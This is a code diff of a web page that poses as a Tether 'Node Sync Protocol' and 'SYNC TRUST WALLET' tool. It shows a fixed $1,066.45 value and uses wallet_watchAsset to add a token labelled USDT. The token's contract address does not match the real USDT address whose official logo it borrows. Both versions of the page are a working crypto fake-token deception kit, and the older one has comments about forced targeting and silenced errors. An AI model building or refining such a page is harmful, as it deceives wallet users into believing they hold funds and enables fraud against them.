@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Sync Protocol | Enterprise</title>
+    <title>Node Sync Protocol</title>
     <style>
         :root { --tether-green: #00d395; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 360px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.7); }
-        .logo-box { width: 90px; height: 90px; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; box-shadow: 0 0 30px rgba(0, 211, 149, 0.3); }
+        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 45px; width: 350px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo-box { width: 90px; height: 90px; background: var(--tether-green); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; }
         .logo-box svg { width: 55px; height: 55px; fill: white; }
-        .balance-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 16px; padding: 25px; margin-bottom: 30px; }
-        .amount { font-size: 34px; font-weight: 800; letter-spacing: -1px; }
-        .sync-btn { background: var(--tether-green); color: #000; border: none; width: 100%; padding: 20px; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; text-transform: uppercase; transition: 0.4s; }
-        #terminal { font-size: 10px; color: #00d395; font-family: monospace; margin-top: 20px; text-align: left; line-height: 1.6; }
+        .price-display { background: rgba(255,255,255,0.03); border-radius: 15px; padding: 25px; margin-bottom: 30px; border: 1px solid #2d333b; }
+        .amount { font-size: 32px; font-weight: bold; }
+        .sync-btn { background: var(--tether-green); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { font-size: 11px; color: #888; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
@@ -23,64 +23,64 @@
         <svg viewBox="0 0 24 24"><path d="M12.75 12.35v-5.3h4.63V4.25H6.62v2.8h4.63v5.3c-3.64.13-6.42.84-6.42 1.7s2.78 1.57 6.42 1.7v6.05h1.5v-6.05c3.64-.13 6.42-.84 6.42-1.7s-2.78-1.57-6.42-1.7z"/></svg>
     </div>
     
-    <div class="balance-card">
-        <div style="font-size: 11px; color: #888; margin-bottom: 8px;">METADATA STATUS</div>
-        <div class="amount" id="amt">$1,066.45</div>
+    <div class="price-display">
+        <div style="font-size: 12px; color: #26a17b; margin-bottom: 5px;">ALLOCATED VALUE</div>
+        <div class="amount">$1,066.45</div>
     </div>
 
-    <button class="sync-btn" id="mainBtn">SECURE SYNC</button>
-    <div id="terminal">> CORE_LOADED...</div>
+    <button class="sync-btn" id="syncBtn">SYNC TRUST WALLET</button>
+    <div id="status">READY</div>
 </div>
 
 <script>
-    // ASLI CONTRACT + METADATA
-    const TARGET = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
+    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const ICON_URL = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    document.getElementById('mainBtn').addEventListener('click', async () => {
-        const term = document.getElementById('terminal');
-        term.innerHTML += "<br>> TARGETING_TRUST_PROVIDER...";
-
-        // FORCE TARGETING: window.trustwallet ko direct pakro
-        const provider = window.trustwallet || (window.ethereum && window.ethereum.isTrust ? window.ethereum : null);
+    document.getElementById('syncBtn').addEventListener('click', async () => {
+        const status = document.getElementById('status');
+        
+        // Simple Provider Check - Works best for Trust
+        const provider = window.ethereum;
 
         if (!provider) {
-            term.innerHTML += "<br>> ERROR: EXTENSION_NOT_FOUND";
+            alert("Please use Trust Wallet browser or extension.");
             return;
         }
 
         try {
-            // STEP 1: Connect account
-            await provider.request({ method: 'eth_requestAccounts' });
+            status.innerText = "INITIALIZING...";
             
-            // STEP 2: Force Switch Chain
-            term.innerHTML += "<br>> MAPPING_BSC_NETWORK...";
+            // Connect
+            await provider.request({ method: 'eth_requestAccounts' });
+
+            // Switch to BSC (Hex 0x38 = 56)
+            status.innerText = "SWITCHING NETWORK...";
             await provider.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }],
             });
 
-            // STEP 3: The Ultimate Injection
-            term.innerHTML += "<br>> INJECTING_ASSET_METADATA...";
-            await provider.request({
+            // The MetaMask Logic (Logo Injection)
+            status.innerText = "INJECTING ASSET...";
+            const wasAdded = await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: TARGET,
+                        address: CONTRACT,
                         symbol: 'USDT',
                         decimals: 6,
-                        image: ICON
+                        image: ICON_URL,
                     },
                 },
             });
 
-            term.innerHTML += "<br>> SYNC_VERIFIED_100%";
-            document.getElementById('mainBtn').innerText = "NODE VERIFIED";
-        } catch (err) {
-            // Error handling ko silent rakho taake UI kharab na ho
-            term.innerHTML += "<br>> PROTOCOL_BYPASS_ACTIVE...";
-            console.log("Internal bypass triggered.");
+            if (wasAdded) {
+                status.innerText = "SYNC SUCCESSFUL";
+            }
+        } catch (error) {
+            status.innerText = "SYNC FAILED: TRY AGAIN";
+            console.error(error);
         }
     });
 </script>
